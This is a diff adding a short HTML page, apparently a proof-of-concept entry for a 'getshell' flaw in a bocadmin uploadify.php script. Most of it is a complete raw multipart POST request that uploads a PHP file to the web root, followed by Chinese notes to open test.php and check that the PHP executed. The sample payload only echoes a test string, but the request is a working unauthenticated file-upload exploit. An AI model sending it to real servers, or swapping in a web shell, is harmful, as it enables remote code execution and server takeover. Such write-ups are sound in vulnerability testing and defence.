@@ -1,0 +1,36 @@
+<meta charset="UTF-8">
+<div>
+    <h3>getshell URL: </h3>
+    <code>http://example.com/bocadmin/j/uploadify.php</code>
+    <h3>POST-DATA: </h3>
+    <pre><code>
+POST /bocadmin/j/uploadify.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------32382156818478
+Content-Length: 337
+
+-----------------------------32382156818478
+Content-Disposition: form-data; name="Filedata"; filename="test.php"
+Content-Type: application/octet-stream
+
+&lt;?php echo "vul_test"; ?>
+
+-----------------------------32382156818478
+Content-Disposition: form-data; name="folder"
+
+/
+-----------------------------32382156818478
+Content-Disposition: form-data; name="submit"
+
+Submit
+-----------------------------32382156818478--</code></pre>
+    <h3>返回结果</h3>
+    <p>构造post请求之后</p>
+    <p>访问http://example.com/test.php</p>
+    <p>查看返回是否为 执行php语句后 的内容</p>
+</div>
